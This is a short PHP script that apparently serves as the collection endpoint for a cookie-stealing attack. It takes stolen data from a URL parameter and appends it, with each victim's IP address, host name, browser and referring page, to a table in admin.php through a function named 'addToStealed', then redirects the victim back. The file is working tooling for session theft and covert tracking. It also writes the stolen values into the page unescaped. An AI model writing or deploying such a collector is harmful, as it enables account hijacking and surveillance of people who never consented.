<?php 


	
	$found = false;
	function addToStealed($file, $cars,  $ip, $host, $navigator, $date, $heure, $provenance, $data)
	{
		$tmp		= file($file);
		$newPage	= '';
		while($ligneActuelle = array_shift($tmp))
		{
			//if(preg_match("#<!-- Breakpoint -->#",$ligneActuelle)) //si on rencontre le breakpoint
			if($ligneActuelle == "<!-- Breakpoint -->\n") //si on rencontre le breakpoint
			{
				
				$newPage .= "<tr><td>$cars</td><td>$ip</td><td>$host</td><td>$navigator</td><td>$date</td><td>$heure</td><td>$provenance</td><td>$data</td></tr>";
				$newPage .= "\n<!-- Breakpoint -->\n";
			}
			else
				$newPage .= $ligneActuelle;
		}
		
		$monfichier = fopen($file, 'w');
		fseek($monfichier, 0);
		fputs($monfichier, $newPage);
	 
		fclose($monfichier);
	}
	
	
	if(isset($_GET['c']))	$data	= $_GET['c'];
	else 					$data	= 'No data';
	
	
	function check_if_excite($data)
	{
			$productFile = file_get_contents('admin.php');
			$products = str_word_count($productFile, 1);
			echo strpos($data,$productFile);
			 if (strpos(file_get_contents("./admin.php"),$data) !== false) {
			 	$found = TRUE;
			 	echo " yes ";
			 	echo $data;
			 	echo ' ' ;
			 	echo "<script>history.back();</script>";
			 }else{

			 	echo " no ";

			 	$ip		= $_SERVER['REMOTE_ADDR'];
				$host		= gethostbyaddr($ip);
				$navigator	= $_SERVER['HTTP_USER_AGENT'];
				$date		= date("d/m/Y");
				$heure		= date("H:i:s");
				$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';

				$cars = (int)file_get_contents("./count.txt");
				// echo $cars;
				// echo "  ";
				$cars = $cars+1;
				// echo $cars;
				// echo "  ";
				$counrtfile = fopen("./count.txt", 'w');
				fputs($counrtfile, $cars);
				fclose($counrtfile);
			 	addToStealed("admin.php", $cars,  $ip, $host, $navigator, $date, $heure, $provenance, $data);
		   		echo "Unauthorized Access";
		   		echo "<script>history.back();</script>";
			 }
			// echo $products;
			
	}
	check_if_excite($data);
	// if ($found) {
	//      echo 'The status doesnt contain a product';
	// }
	// else {
	   
	// }

	// echo "Unauthorized Access";
	// echo "<script>history.back();</script>";
?>